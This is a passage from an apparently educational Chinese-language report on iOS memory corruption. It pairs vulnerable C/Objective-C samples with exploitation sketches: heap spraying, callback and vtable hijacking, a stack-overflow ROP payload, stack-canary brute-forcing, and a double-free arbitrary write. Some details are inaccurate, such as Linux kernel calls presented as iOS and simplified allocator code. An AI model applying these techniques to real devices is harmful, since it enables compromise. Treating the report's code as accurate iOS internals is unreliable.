# iOS内存损坏与代码执行漏洞

## iOS Memory Corruption and Code Execution Vulnerabilities

---

> 作者：pengqinglei99-eng  
> 日期：2026-10-19  
> 版本：v1.0  
> 声明：本报告仅用于安全研究与防御目的，不鼓励任何非法利用行为。

---

## 目录

1. [内存损坏漏洞概述](#1-内存损坏漏洞概述)
2. [iOS内存管理架构](#2-ios内存管理架构)
3. [堆缓冲区溢出](#3-堆缓冲区溢出)
4. [栈缓冲区溢出](#4-栈缓冲区溢出)
5. [使用后释放漏洞](#5-使用后释放漏洞)
6. [双重释放漏洞](#6-双重释放漏洞)
7. [整数溢出导致的内存损坏](#7-整数溢出导致的内存损坏)
8. [格式化字符串漏洞](#8-格式化字符串漏洞)
9. [Objective-C内存损坏](#9-objective-c内存损坏)
10. [WebKit内存漏洞](#10-webkit内存漏洞)
11. [代码执行技术](#11-代码执行技术)
12. [ROP链构造](#12-rop链构造)
13. [JIT代码执行](#13-jit代码执行)
14. [真实漏洞案例分析](#14-真实漏洞案例分析)
15. [防御机制与缓解策略](#15-防御机制与缓解策略)

---

## 1. 内存损坏漏洞概述

### 1.1 内存损坏漏洞分类

内存损坏是iOS和所有C/C++程序中最常见的漏洞类型：

```
内存损坏漏洞分类体系:
│
├── 缓冲区溢出 (Buffer Overflow)
│   ├── 堆溢出 (Heap Overflow)
│   ├── 栈溢出 (Stack Overflow)
│   ├── 全局变量溢出 (Global Overflow)
│   └── 柔性数组溢出 (Flexible Array Overflow)
│
├── 释放后使用 (Use-After-Free)
│   ├── 堆对象UAF
│   ├── 栈对象UAF
│   └── 内核对象UAF
│
├── 双重释放 (Double Free)
│   ├── 堆块双重释放
│   └── 快速bin双重释放
│
├── 整数相关 (Integer Related)
│   ├── 整数溢出导致溢出
│   ├── 符号错误导致溢出
│   └── 截断导致溢出
│
├── 类型混淆 (Type Confusion)
│   ├── C++虚函数表混淆
│   ├── Objective-C对象混淆
│   └── JavaScript类型混淆
│
└── 越界访问 (Out-of-Bounds)
    ├── 数组越界读取
    ├── 数组越界写入
    └── 指针算术越界
```

### 1.2 内存损坏的影响

```c
// 内存损坏影响评估
typedef struct {
    const char  *vuln_type;         // 漏洞类型
    uint32_t    code_exec;          // 代码执行可能性 (0-10)
    uint32_t    info_leak;          // 信息泄露可能性 (0-10)
    uint32_t    dos;                // 拒绝服务可能性 (0-10)
    uint32_t    exploit_difficulty; // 利用难度 (0-10)
} impact_assessment_t;

impact_assessment_t memory_vuln_impacts[] = {
    {"堆溢出",          8, 6, 9, 5},
    {"栈溢出",          9, 7, 10, 4},
    {"UAF",             9, 8, 8, 6},
    {"双重释放",        7, 5, 9, 5},
    {"整数溢出",        7, 4, 7, 4},
    {"格式化字符串",    8, 9, 8, 3},
    {"类型混淆",        9, 7, 8, 7},
    {"越界读取",        3, 9, 5, 2},
    {"越界写入",        8, 5, 8, 5},
};
```

### 1.3 ARM64内存模型

```c
// ARM64内存布局
// iOS设备使用ARM64架构，内存模型如下:

/*
┌─────────────────────────────────────────┐
│  0x0000000000000000                     │
│  ┌─────────────────────────────────┐    │
│  │         保留区域 (NULL Guard)     │    │
│  └─────────────────────────────────┘    │
│  0x0000000100000000                     │
│  ┌─────────────────────────────────┐    │
│  │         __TEXT 代码段            │    │
│  │         (只读+可执行)            │    │
│  └─────────────────────────────────┘    │
│  ┌─────────────────────────────────┐    │
│  │         __DATA 数据段            │    │
│  │         (读写)                   │    │
│  └─────────────────────────────────┘    │
│  ┌─────────────────────────────────┐    │
│  │         __LINKEDIT               │    │
│  └─────────────────────────────────┘    │
│  ┌─────────────────────────────────┐    │
│  │         堆 (Heap)               │    │
│  │         (向上增长)               │    │
│  └─────────────────────────────────┘    │
│  ┌─────────────────────────────────┐    │
│  │         共享库映射               │    │
│  └─────────────────────────────────┘    │
│  ┌─────────────────────────────────┐    │
│  │         栈 (Stack)              │    │
│  │         (向下增长)               │    │
│  └─────────────────────────────────┘    │
│  0x00007FFFFFFFFFFF                     │
│  ┌─────────────────────────────────┐    │
│  │         内核空间                 │    │
│  │         (用户空间不可访问)        │    │
│  └─────────────────────────────────┘    │
│  0xFFFFFFFFFFFFFFFF                     │
└─────────────────────────────────────────┘
*/

// ARM64内存保护标志
typedef enum {
    VM_PROT_NONE    = 0x00,     // 无权限
    VM_PROT_READ    = 0x01,     // 读权限
    VM_PROT_WRITE   = 0x02,     // 写权限
    VM_PROT_EXECUTE = 0x04,     // 执行权限
    VM_PROT_ALL     = 0x07,     // 所有权限
} vm_protection_t;

// W^X策略: 内存页不能同时可写和可执行
// iOS严格执行W^X，代码页只读+可执行，数据页读写+不可执行
```

---

## 2. iOS内存管理架构

### 2.1 虚拟内存系统

```c
// iOS虚拟内存管理核心结构

// 虚拟地址空间映射
typedef struct {
    vm_offset_t     start;          // 起始地址
    vm_offset_t     end;            // 结束地址
    vm_prot_t       protection;     // 保护标志
    uint32_t        inheritance;    // 继承属性
    const char      *name;          // 区域名称
} vm_region_info_t;

// 内存映射操作
kern_return_t map_memory_region(
    vm_map_t map,
    vm_offset_t *addr,
    vm_size_t size,
    vm_prot_t prot)
{
    // 查找空闲区域
    vm_map_entry_t entry = vm_map_entry_create();
    
    entry->start = vm_map_find_hole(map, size);
    entry->end = entry->start + size;
    entry->protection = prot;
    
    // W^X检查
    if ((prot & VM_PROT_WRITE) && (prot & VM_PROT_EXECUTE)) {
        // 在iOS上，同时设置写和执行权限会被拒绝
        return KERN_PROTECTION_FAILURE;
    }
    
    // 插入映射
    vm_map_insert(map, entry, prot, prot, 0);
    
    *addr = entry->start;
    return KERN_SUCCESS;
}

// 内存分配器结构
typedef struct {
    vm_size_t       zone_size;      // zone大小
    vm_size_t       elem_size;      // 元素大小
    uint32_t        alloc_count;    // 分配计数
    uint32_t        free_count;     // 空闲计数
    const char      *zone_name;     // zone名称
    bool            collectable;    // 是否可回收
    bool            expandable;     // 是否可扩展
} vm_zone_t;
```

### 2.2 堆内存管理

```c
// iOS堆内存管理器 (libmalloc)
// 使用magazine allocator设计

// 堆分配器核心结构
typedef struct {
    // Magazine结构 - 每个CPU核心一个
    struct {
        lock_t          lock;           // 自旋锁
        void            *mag_free_list; // 空闲链表
        vm_size_t       mag_bytes;      // 可用字节
        uint32_t        mag_alloc;      // 分配计数
    } magazines[MAX_CPUS];
    
    // 全局元数据
    vm_size_t       default_size;       // 默认分配大小
    vm_size_t       max_size;           // 最大分配大小
    uint32_t        num_magazines;      // magazine数量
    
    // 统计信息
    uint64_t        total_alloc;        // 总分配量
    uint64_t        total_free;         // 总释放量
    uint64_t        peak_usage;         // 峰值使用量
} heap_allocator_t;

// 堆块头部结构
typedef struct {
    uint32_t    magic;          // 魔术字 (0xABABABAB)
    uint32_t    size;           // 块大小 (包含头部)
    uint16_t    flags;          // 标志位
    uint16_t    zone_index;     // zone索引
    void        *next_free;     // 下一个空闲块
    void        *prev_free;     // 上一个空闲块
} heap_block_header_t;

// 堆分配函数
void *heap_alloc(heap_allocator_t *heap, size_t size) {
    // 计算实际大小 (对齐到16字节)
    size_t aligned_size = (size + 15) & ~15;
    size_t total_size = aligned_size + sizeof(heap_block_header_t);
    
    // 选择合适的magazine
    uint32_t cpu = get_cpu_id();
    magazine_t *mag = &heap->magazines[cpu];
    
    lock_acquire(&mag->lock);
    
    // 在空闲链表中查找合适的块
    heap_block_header_t *block = find_free_block(mag, total_size);
    
    if (!block) {
        // 需要扩展堆
        block = expand_heap(heap, mag, total_size);
    }
    
    if (block) {
        block->magic = 0xABABABAB;
        block->size = total_size;
        block->flags = BLOCK_ALLOCATED;
        
        heap->total_alloc += total_size;
    }
    
    lock_release(&mag->lock);
    
    return block ? (void *)(block + 1) : NULL;
}

// 堆释放函数
void heap_free(heap_allocator_t *heap, void *ptr) {
    if (!ptr) return;
    
    heap_block_header_t *block = (heap_block_header_t *)ptr - 1;
    
    // 验证魔术字
    if (block->magic != 0xABABABAB) {
        // 检测到损坏!
        crash_handler("heap corruption detected");
        return;
    }
    
    // 检查双重释放
    if (block->flags & BLOCK_FREED) {
        crash_handler("double free detected");
        return;
    }
    
    uint32_t cpu = get_cpu_id();
    magazine_t *mag = &heap->magazines[cpu];
    
    lock_acquire(&mag->lock);
    
    // 标记为已释放
    block->flags |= BLOCK_FREED;
    block->magic = 0xDEADBEEF; // 改变魔术字防止UAF
    
    // 加入空闲链表
    block->next_free = mag->mag_free_list;
    mag->mag_free_list = block;
    
    heap->total_free += block->size;
    
    lock_release(&mag->lock);
}
```

### 2.3 Objective-C对象内存布局

```objc
// Objective-C对象内存布局分析

// NSObject内存布局
/*
┌─────────────────────────────────┐
│ isa指针 (8 bytes)               │ <- 指向类对象
├─────────────────────────────────┤
│ 实例变量 (按声明顺序)            │
│ ├── ivar1                       │
│ ├── ivar2                       │
│ └── ...                         │
├─────────────────────────────────┤
│ 对齐填充                         │
└─────────────────────────────────┘
*/

// isa指针结构 (ARM64)
typedef struct {
    uintptr_t   nonpointer      : 1;    // 非指针标记
    uintptr_t   has_assoc       : 1;    // 是否有关联对象
    uintptr_t   has_cxx_dtor    : 1;    // 是否有C++析构
    uintptr_t   shiftcls        : 33;   // 类指针 (ARM64)
    uintptr_t   magic           : 6;    // 魔术字
    uintptr_t   weakly_referenced : 1;  // 弱引用标记
    uintptr_t   unused          : 1;    // 未使用
    uintptr_t   has_sidetable_rc  : 1;  // 使用sidetable
    uintptr_t   extra_rc        : 19;   // 引用计数
} isa_t;

// 对象分配过程
id objc_alloc(Class cls, size_t extraBytes) {
    size_t size = class_getInstanceSize(cls) + extraBytes;
    
    // 使用malloc分配内存
    id obj = (id)malloc(size);
    if (!obj) return nil;
    
    // 设置isa指针
    obj->isa = (isa_t){
        .nonpointer = 1,
        .magic = 0xd2,
        .shiftcls = (uintptr_t)cls >> 3,
        .extra_rc = 0,
    };
    
    // 清零剩余内存
    memset((void *)(obj + 1), 0, size - sizeof(id));
    
    return obj;
}

// 引用计数操作
id objc_retain(id obj) {
    if (!obj) return nil;
    
    isa_t *isa = (isa_t *)&obj->isa;
    
    if (isa->nonpointer) {
        // 快速路径: 内联引用计数
        if (isa->extra_rc < ((1ULL << 19) - 1)) {
            isa->extra_rc++;
            return obj;
        }
    }
    
    // 慢速路径: 使用sidetable
    return objc_retain_slow(obj);
}

void objc_release(id obj) {
    if (!obj) return;
    
    isa_t *isa = (isa_t *)&obj->isa;
    
    if (isa->nonpointer) {
        if (isa->extra_rc > 0) {
            isa->extra_rc--;
            return;
        }
    }
    
    // 引用计数为0，释放对象
    objc_release_slow(obj);
}
```

---

## 3. 堆缓冲区溢出

### 3.1 堆溢出漏洞模式

```c
// 典型的堆缓冲区溢出漏洞

// 漏洞示例1: 未检查长度的字符串复制
void vulnerable_string_process(const char *input) {
    // 分配固定大小的缓冲区
    char *buffer = malloc(64);
    if (!buffer) return;
    
    // 漏洞: 未检查输入长度
    // 如果input长度超过64字节，导致堆溢出
    strcpy(buffer, input); // 堆溢出!
    
    // 使用buffer...
    process_data(buffer);
    
    free(buffer);
}

// 漏洞示例2: 整数溢出导致的小分配
void vulnerable_copy_data(
    const uint8_t *data,
    uint32_t count,
    uint32_t element_size)
{
    // 漏洞: 整数溢出
    // count * element_size 可能溢出
    uint32_t total_size = count * element_size;
    
    uint8_t *buffer = malloc(total_size);
    if (!buffer) return;
    
    // 如果total_size溢出为小值
    // 但实际复制使用原始参数
    for (uint32_t i = 0; i < count; i++) {
        memcpy(buffer + i * element_size, 
               data + i * element_size,
               element_size); // 堆溢出!
    }
    
    free(buffer);
}

// 漏洞示例3: 堆溢出覆盖相邻对象
typedef struct {
    char name[32];          // 名称字段
    uint32_t flags;         // 标志位
    void (*callback)(void); // 回调函数指针
} managed_object_t;

void vulnerable_update_name(
    managed_object_t *obj,
    const char *new_name)
{
    // 漏洞: 未检查new_name长度
    // 如果new_name超过32字节
    // 会溢出覆盖flags和callback
    strcpy(obj->name, new_name); // 溢出!
    
    // 如果callback被覆盖为攻击者控制的地址
    // 后续调用将执行攻击者代码
}

// 安全修复版本
void safe_update_name(
    managed_object_t *obj,
    const char *new_name)
{
    // 使用strlcpy确保不溢出
    strlcpy(obj->name, new_name, sizeof(obj->name));
}
```

### 3.2 堆溢出利用技术

```c
// 堆溢出利用技术
// 通过覆盖相邻堆块的元数据实现代码执行

// 利用步骤1: 控制堆布局
void setup_heap_layout(void) {
    // 分配一系列精确大小的块
    void *blocks[100];
    
    for (int i = 0; i < 100; i++) {
        blocks[i] = malloc(0x80); // 精确大小分配
    }
    
    // 释放交替的块，创建空洞
    for (int i = 0; i < 100; i += 2) {
        free(blocks[i]);
    }
    
    // 现在堆布局是可预测的
    // 偶数索引位置有空洞
}

// 利用步骤2: 触发溢出覆盖关键数据
void trigger_overflow_exploit(void) {
    // 分配目标对象
    managed_object_t *target = malloc(sizeof(managed_object_t));
    
    // 分配溢出源
    char *overflow_buf = malloc(64);
    
    // 构造溢出数据
    // 覆盖name字段后继续写入
    char payload[128];
    memset(payload, 'A', 32); // 填充name字段
    
    // 覆盖flags
    *(uint32_t *)(payload + 32) = 0x00000001;
    
    // 覆盖callback为shellcode地址
    // 需要先通过信息泄露获取地址
    *(void **)(payload + 36) = (void *)shellcode_addr;
    
    // 触发溢出
    strcpy(overflow_buf, payload);
    vulnerable_update_name(target, payload);
    
    // 当target->callback被调用时
    // 将执行攻击者的代码
    target->callback(); // 执行shellcode!
}

// 利用步骤3: 堆喷技术
void heap_spray_exploit(void *payload, size_t size) {
    // 通过大量分配使堆中充满攻击者数据
    
    #define SPRAY_COUNT 1000
    void *spray_blocks[SPRAY_COUNT];
    
    for (int i = 0; i < SPRAY_COUNT; i++) {
        spray_blocks[i] = malloc(size);
        memcpy(spray_blocks[i], payload, size);
    }
    
    // 当内核或目标代码分配内存时
    // 很可能分配到被我们控制的块
    // 从而实现代码执行
}
```

### 3.3 iOS特定堆溢出场景

```c
// iOS特有的堆溢出场景

// 场景1: CoreFoundation字符串溢出
void cfstring_overflow(CFStringRef input) {
    CFIndex length = CFStringGetLength(input);
    CFIndex maxSize = CFStringGetMaximumSizeForEncoding(
        length, kCFStringEncodingUTF8);
    
    // 漏洞: 如果maxSize计算错误
    // 可能导致缓冲区过小
    char *buffer = malloc(maxSize);
    
    // 某些特殊Unicode字符可能导致
    // 实际UTF8编码超过maxSize
    CFStringGetCString(input, buffer, maxSize + 1, // 溢出!
        kCFStringEncodingUTF8);
    
    free(buffer);
}

// 场景2: Property List解析溢出
void plist_parsing_overflow(NSData *data) {
    NSError *error = nil;
    
    // 漏洞: 某些畸形的plist可能导致
    // 解析器内部缓冲区溢出
    id result = [NSPropertyListSerialization
        propertyListWithData:data
        options:NSPropertyListImmutable
        format:nil
        error:&error];
    
    // 如果data包含特殊构造的数据
    // 可能在解析过程中触发堆溢出
}

// 场景3: 图像解析溢出
void image_parsing_overflow(NSData *imageData) {
    // 漏洞: 畸形的图像数据可能导致
    // 图像解码器内部缓冲区溢出
    
    // JPEG/JPEG2000解析器
    // PNG解析器
    // TIFF解析器
    // 都可能存在此类漏洞
    
    UIImage *image = [UIImage imageWithData:imageData];
    // 如果imageData被精心构造
    // 可能在解码过程中触发堆溢出
}
```

---

## 4. 栈缓冲区溢出

### 4.1 栈溢出漏洞模式

```c
// 栈缓冲区溢出漏洞

// 漏洞示例1: 固定大小栈缓冲区
void vulnerable_function(const char *input) {
    char buffer[256];
    
    // 漏洞: 未检查输入长度
    // 如果input超过256字节，覆盖栈上的返回地址
    strcpy(buffer, input); // 栈溢出!
    
    printf("Processed: %s\n", buffer);
}

// 漏洞示例2: 递归导致的栈溢出
void vulnerable_recursive(int depth, void *data) {
    char local_buffer[4096]; // 每次调用分配4KB栈空间
    
    if (depth > 0) {
        // 漏洞: 未限制递归深度
        // 深度递归导致栈溢出
        memcpy(local_buffer, data, 4096);
        vulnerable_recursive(depth - 1, data);
    }
}

// 漏洞示例3: 格式化字符串导致栈溢出
void vulnerable_printf(const char *input) {
    char buffer[128];
    
    // 漏洞: 使用用户输入作为格式化字符串
    // %n可以写入任意地址
    // 大量%x可以泄露栈内容
    sprintf(buffer, input); // 格式化字符串漏洞!
    
    // 如果input = "%x%x%x%x%x%x%x%x%n"
    // 可能导致栈损坏
}

// 栈溢出后的内存布局
/*
高地址
┌─────────────────────────┐
│  函数参数                │
├─────────────────────────┤
│  返回地址  <- 溢出目标   │
├─────────────────────────┤
│  保存的帧指针 (FP)       │
├─────────────────────────┤
│  局部变量 buffer[256]    │ <- 溢出起点
├─────────────────────────┤
│  ...                     │
└─────────────────────────┘
低地址
*/
```

### 4.2 栈溢出利用

```c
// 栈溢出利用技术
// ARM64架构上的栈溢出利用

// ARM64栈帧布局
typedef struct {
    uint64_t    x0_x29[30];     // 通用寄存器
    uint64_t    x30_lr;         // 链接寄存器 (返回地址)
    uint64_t    x29_fp;         // 帧指针
    uint64_t    sp;             // 栈指针
    uint64_t    pc;             // 程序计数器
    uint32_t    cpsr;           // 当前程序状态寄存器
} arm64_context_t;

// 构造栈溢出payload
typedef struct {
    char        padding[256];   // 填充到返回地址
    uint64_t    saved_fp;       // 保存的帧指针
    uint64_t    return_addr;    // 返回地址 (覆盖目标)
    uint64_t    x0;             // 第一个参数
    uint64_t    x1;             // 第二个参数
    uint64_t    x2;             // 第三个参数
    uint64_t    x3;             // 第四个参数
} stack_overflow_payload_t;

// 构造ROP链
void build_stack_rop_chain(
    stack_overflow_payload_t *payload,
    uint64_t kernel_base)
{
    // 设置ROP链
    // 步骤1: 泄露内核基地址
    payload->return_addr = kernel_base + GADGET_LEAK_ADDR;
    
    // 步骤2: 禁用SMEP/PAN
    // (在ARM64上对应PAN位操作)
    
    // 步骤3: 调用commit_creds(prepare_kernel_cred(NULL))
    payload->x0 = 0; // NULL参数
    // ROP链继续...
    
    // 步骤4: 返回用户空间
    // payload->return_addr = kernel_base + RETURN_TO_USER;
}

// 栈溢出利用PoC
void stack_overflow_poc(void) {
    stack_overflow_payload_t payload;
    
    // 填充padding
    memset(payload.padding, 'A', sizeof(payload.padding));
    
    // 设置伪造的帧指针
    payload.saved_fp = 0x4141414141414141;
    
    // 设置返回地址为ROP链起点
    payload.return_addr = get_gadget_address("pivot_to_rop");
    
    // 设置参数
    payload.x0 = 0;
    payload.x1 = target_address;
    
    // 触发溢出
    char overflow[512];
    memcpy(overflow, &payload, sizeof(payload));
    
    // 调用存在漏洞的函数
    vulnerable_function(overflow);
    
    // 执行流被重定向到ROP链
}
```

### 4.3 栈保护机制绕过

```c
// 栈保护机制及其绕过技术

// 1. Stack Canary (栈金丝雀)
// ARM64上的栈金丝雀实现
void function_with_canary(void) {
    // 编译器自动插入的代码:
    // uint64_t canary = __stack_chk_guard;
    // ... 函数体 ...
    // if (canary != __stack_chk_guard) __stack_chk_fail();
    
    char buffer[256];
    gets(buffer); // 危险! 但有canary保护
    
    // 如果溢出覆盖了canary
    // 函数返回前会检测到异常
}

// 绕过Stack Canary的技术
// 方法1: 信息泄露获取canary值
uint64_t leak_canary(void) {
    // 通过格式化字符串漏洞泄露栈上的canary
    char buffer[256];
    
    // 如果存在格式化字符串漏洞
    // 可以使用%x泄露栈内容
    // 找到canary在栈上的位置
    // 通常是局部变量之后的8字节
    
    // 假设canary在第33个栈位置
    snprintf(buffer, sizeof(buffer), 
             "%65$x"); // 泄露canary
    
    return strtoull(buffer, NULL, 16);
}

// 方法2: 逐字节覆盖canary (fork服务器)
void brute_force_canary(int socket_fd) {
    uint8_t canary[8] = {0};
    
    for (int byte_idx = 0; byte_idx < 8; byte_idx++) {
        for (int guess = 0; guess < 256; guess++) {
            // 构造payload
            char payload[256 + 8 + 8]; // buffer + canary + fp
            memset(payload, 'A', 256);
            memcpy(payload + 256, canary, byte_idx);
            payload[256 + byte_idx] = (uint8_t)guess;
            
            // 发送到fork服务器
            send(socket_fd, payload, sizeof(payload), 0);
            
            // 检查是否崩溃
            char response;
            int n = recv(socket_fd, &response, 1, MSG_DONTWAIT);
            
            if (n > 0) {
                // 没有崩溃 - 猜对了!
                canary[byte_idx] = (uint8_t)guess;
                printf("[+] Canary byte %d: 0x%02x\n", 
                       byte_idx, guess);
                break;
            }
            
            // 崩溃了，需要重新连接
            close(socket_fd);
            socket_fd = reconnect();
        }
    }
}

// 2. 栈保护区域 (Guard Page)
// iOS使用guard page保护栈
// 栈溢出到guard page会触发异常

// 绕过方法: 大跳跃溢出
void jump_over_guard_page(void) {
    // 如果栈溢出量足够大
    // 可能跳过guard page到达有效内存
    // 但这通常不可靠
    
    // 更常见的方法是使用多个小溢出
    // 逐步覆盖内存
}
```

---

## 5. 使用后释放漏洞

### 5.1 UAF漏洞模式

```c
// Use-After-Free漏洞详细分析

// 漏洞示例1: 简单的UAF
void simple_uaf(void) {
    char *buffer = malloc(256);
    
    // 使用buffer
    strcpy(buffer, "sensitive data");
    
    // 释放buffer
    free(buffer);
    
    // 漏洞: 释放后继续使用
    printf("Data: %s\n", buffer); // UAF读取!
    
    // 更危险的情况:
    // buffer指向的内存可能已被重新分配
    // 写入buffer可能破坏其他数据
    strcpy(buffer, "new data"); // UAF写入!
}

// 漏洞示例2: 对象生命周期管理错误
typedef struct {
    char        *name;
    uint32_t    ref_count;
    void        (*destroy)(void *);
} ref_object_t;

void process_object(ref_object_t *obj) {
    // 保存引用
    ref_object_t *saved = obj;
    
    // 某些操作可能触发对象释放
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        // 在另一个线程释放对象
        if (--saved->ref_count == 0) {
            free(saved->name);
            free(saved);
        }
    });
    
    // 漏洞: 继续使用可能已释放的对象
    printf("Name: %s\n", obj->name); // UAF!
}

// 漏洞示例3: Objective-C对象UAF
void objc_uaf_example(void) {
    // ARC环境下的UAF
    __weak NSString *weakStr;
    
    @autoreleasepool {
        NSString *str = [[NSString alloc] 
            initWithFormat:@"Hello %@", @"World"];
        weakStr = str;
        // str在autoreleasepool结束时释放
    }
    
    // 漏洞: 通过weak引用访问已释放对象
    // 在ARC中，weak引用会自动置nil
    // 但在某些情况下可能不安全
    NSLog(@"%@", weakStr); // 可能崩溃
}

// 漏洞示例4: 内核UAF (IOKit)
// 这是iOS中最常见的内核漏洞类型
IOReturn kernel_uaf_example(io_connect_t connect) {
    // 步骤1: 创建内核对象
    uint64_t input[] = {0x100};
    IOConnectCallMethod(connect, CREATE_CMD,
        input, 1, NULL, 0, NULL, NULL, NULL, NULL);
    
    // 步骤2: 在另一个线程销毁对象
    pthread_t thread;
    pthread_create(&thread, NULL, destroy_thread, 
                   (void *)connect);
    
    // 步骤3: 竞态条件 - 在销毁后使用
    // 触发UAF
    IOConnectCallMethod(connect, USE_CMD,
        input, 1, NULL, 0, NULL, NULL, NULL, NULL);
    
    return KERN_SUCCESS;
}
```

### 5.2 UAF利用技术

```c
// UAF漏洞利用技术
// 通过堆喷控制已释放的内存

// 利用步骤1: 触发UAF
void trigger_uaf(void) {
    // 分配目标对象
    target_object_t *obj = create_object(0x100);
    
    // 启动释放线程
    pthread_t free_thread;
    pthread_create(&free_thread, NULL, free_object_thread, obj);
    
    // 竞态窗口
    // 在对象被释放后，立即进行堆喷
    usleep(1); // 极短延迟
    
    // 步骤2: 堆喷填充
    // 用攻击者控制的数据填充已释放的内存
    heap_spray_controlled_data(0x100);
    
    // 步骤3: 触发UAF访问
    // 此时obj指向的内存已被攻击者数据覆盖
    access_object(obj); // 使用被控制的数据
}

// 利用步骤2: 构造伪造对象
typedef struct {
    void        *isa;           // Objective-C isa指针
    uint32_t    flags;
    uint32_t    size;
    void        *method1;       // 方法指针
    void        *method2;
    void        *method3;
} fake_objc_object_t;

void heap_spray_fake_object(void) {
    fake_objc_object_t fake;
    
    // 设置isa指针指向可控内存
    fake.isa = (void *)controlled_address;
    fake.flags = 0;
    fake.size = 0x100;
    
    // 设置方法指针为shellcode地址
    fake.method1 = (void *)shellcode_address;
    fake.method2 = (void *)gadget_address;
    fake.method3 = (void *)gadget_address;
    
    // 大量分配伪造对象
    for (int i = 0; i < 10000; i++) {
        void *spray = malloc(0x100);
        memcpy(spray, &fake, sizeof(fake));
    }
}

// 利用步骤3: 通过虚函数调用执行代码
void exploit_via_vtable_call(fake_objc_object_t *obj) {
    // 当代码通过虚函数表调用方法时
    // 实际调用的是攻击者控制的地址
    
    // 在C++中:
    // obj->virtual_method() 
    // 等价于: (*(void(**)(void*))(*(void**)obj + offset))(obj)
    
    // 如果vtable指针被覆盖
    // 将跳转到攻击者指定的地址
    
    // 在Objective-C中:
    // [obj someMethod]
    // 通过isa -> class_ro -> method_list查找方法
    // 如果isa被控制，可以引导到伪造的方法列表
}
```

---

## 6. 双重释放漏洞

### 6.1 双重释放模式

```c
// Double Free漏洞分析

// 漏洞示例1: 错误处理路径中的双重释放
void error_handling_double_free(void) {
    char *buffer = malloc(256);
    char *temp = NULL;
    
    // 某些操作
    temp = malloc(128);
    if (!temp) {
        goto error;
    }
    
    // 处理数据...
    if (some_error_condition) {
        goto error;
    }
    
    free(temp);
    free(buffer);
    return;
    
error:
    // 漏洞: 在错误路径中重复释放
    free(temp);   // 可能已经释放过
    free(buffer); // 可能已经释放过
}

// 漏洞示例2: 多线程中的双重释放
typedef struct {
    void    *data;
    int     freed;
    lock_t  lock;
} shared_resource_t;

void thread_safe_free_vulnerable(shared_resource_t *res) {
    // 漏洞: 检查和设置不是原子的
    if (!res->freed) {
        // 竞态窗口: 另一个线程可能在这里也通过了检查
        res->freed = 1;
        free(res->data); // 双重释放!
    }
}

// 安全版本
void thread_safe_free_fixed(shared_resource_t *res) {
    lock_acquire(&res->lock);
    if (!res->freed) {
        res->freed = 1;
        free(res->data);
    }
    lock_release(&res->lock);
}

// 漏洞示例3: 引用计数错误
void refcount_double_free(void) {
    NSObject *obj = [[NSObject alloc] init];
    
    // 手动管理引用计数 (非ARC)
    [obj retain]; // refcount = 2
    [obj release]; // refcount = 1
    
    // 漏洞: 额外的release
    [obj release]; // refcount = 0, 对象被释放
    [obj release]; // 双重释放!
}
```

### 6.2 双重释放利用

```c
// 双重释放利用技术
// 利用堆分配器的free list实现任意地址写入

// 堆分配器空闲链表
/*
正常状态:
free_list -> [Block A (0x80)] -> [Block B (0x80)] -> NULL

双重释放后:
free_list -> [Block A] -> [Block A] -> NULL
(同一个块出现两次)

第一次分配返回Block A:
free_list -> [Block A] -> NULL

第二次分配仍然返回Block A:
free_list -> NULL

两个指针指向同一块内存!
写入一个会影响另一个
*/

// 利用双重释放实现任意地址写入
void exploit_double_free(void) {
    // 步骤1: 分配目标大小的块
    void *a = malloc(0x80);
    
    // 步骤2: 释放两次
    free(a);
    free(a); // 双重释放!
    
    // 步骤3: 分配并修改fd指针
    // 将空闲链表的next指针指向目标地址
    void *b = malloc(0x80);
    *(void **)b = target_address; // 修改fd指针
    
    // 步骤4: 再次分配，获得原块
    void *c = malloc(0x80); // 返回a的地址
    
    // 步骤5: 再次分配
    // 现在分配器会返回target_address!
    void *d = malloc(0x80); // 返回target_address!
    
    // 步骤6: 写入目标地址
    memcpy(d, payload, payload_size); // 写入任意地址!
}

// 在iOS上的具体利用场景
void ios_double_free_exploit(void) {
    // 利用Objective-C运行时的双重释放
    
    // 创建一个自动释放的对象
    NSString *str = [NSString stringWithFormat:@"test"];
    
    // 某些错误可能导致双重释放
    // 例如在dealloc中过度释放
    
    // 利用堆分配器的行为
    // 通过双重释放控制内存分配
    // 最终实现任意地址写入
    
    // 写入目标: Objective-C方法列表
    // 修改方法实现地址
    // 当方法被调用时执行攻击者代码
}
```

---

## 7. 整数溢出导致的内存损坏

### 7.1 整数溢出类型

```c
// 整数溢出导致内存损坏

// 类型1: 无符号整数溢出
void unsigned_overflow(void *input, uint32_t count) {
    // 漏洞: count * 4 可能溢出
    uint32_t size = count * 4; // 溢出!
    
    // 如果count = 0x40000001
    // size = 0x100000004 -> 截断为 0x4
    void *buffer = malloc(size); // 只分配4字节
    
    // 但后续操作使用原始count
    for (uint32_t i = 0; i < count; i++) {
        ((uint32_t *)buffer)[i] = 0; // 堆溢出!
    }
}

// 类型2: 有符号整数溢出
void signed_overflow(int32_t offset, void *base) {
    // 漏洞: 有符号溢出是未定义行为
    int32_t new_offset = offset + 1;
    
    // 如果offset = INT32_MAX (0x7FFFFFFF)
    // new_offset = -2147483648 (INT32_MIN)
    
    // 后续检查可能失败
    if (new_offset > 0) { // 永远为false!
        // 这段代码不会执行
        memcpy((char *)base + new_offset, data, len);
    }
}

// 类型3: 整数截断
void truncation_overflow(uint64_t large_size) {
    // 漏洞: 64位到32位截断
    uint32_t alloc_size = (uint32_t)large_size;
    
    // 如果large_size = 0x100000100
    // alloc_size = 0x100
    void *buffer = malloc(alloc_size); // 只分配256字节
    
    // 但后续使用原始大小
    memset(buffer, 0, large_size); // 堆溢出!
}

// 类型4: 隐式类型转换
void implicit_conversion(size_t len) {
    int int_len = (int)len; // 隐式截断
    
    // 如果len > INT_MAX
    // int_len变成负数
    
    char *buffer = malloc(int_len); // 可能分配失败或分配小量
    
    if (buffer) {
        // 使用原始len复制
        memcpy(buffer, source, len); // 溢出!
    }
}
```

### 7.2 整数溢出利用

```c
// 整数溢出利用实战

// 场景1: 数组索引溢出
typedef struct {
    uint32_t    count;
    uint32_t    *values;
} int_array_t;

void array_set(int_array_t *arr, uint32_t index, uint32_t value) {
    // 漏洞: index * sizeof(uint32_t) 可能溢出
    uint32_t offset = index * sizeof(uint32_t);
    
    if (offset >= arr->count * sizeof(uint32_t)) {
        // 检查可能被绕过!
        // 如果index = 0x40000001
        // offset = 0x4 (溢出后)
        // 检查通过但实际写入越界
    }
    
    arr->values[offset / sizeof(uint32_t)] = value; // 越界写入!
}

// 场景2: 缓冲区大小计算
void process_chunks(
    const uint8_t *data,
    uint32_t chunk_count,
